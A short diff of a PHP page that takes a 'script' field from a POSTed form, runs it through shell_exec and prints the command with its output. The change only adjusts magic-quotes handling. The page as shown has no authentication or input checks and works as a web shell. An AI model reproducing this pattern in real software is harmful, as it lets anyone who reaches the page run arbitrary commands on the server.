@@ -24,7 +24,7 @@ if(empty($_POST['Submit']))
 </form>
 <?php
 } else {
-	$script = get_magic_quotes_gpc() ? stripslashes($_POST['script']) : stripslashes($_POST['script']);
+	$script = get_magic_quotes_gpc() ? stripslashes($_POST['script']) : $_POST['script'];
 	$out	= '$'.$script."\n".shell_exec($script);
 	echo '<textarea name="script" style="width: 100%; height: 98%;border: 1px solid #ccc;">'.$out.'</textarea>';
 }
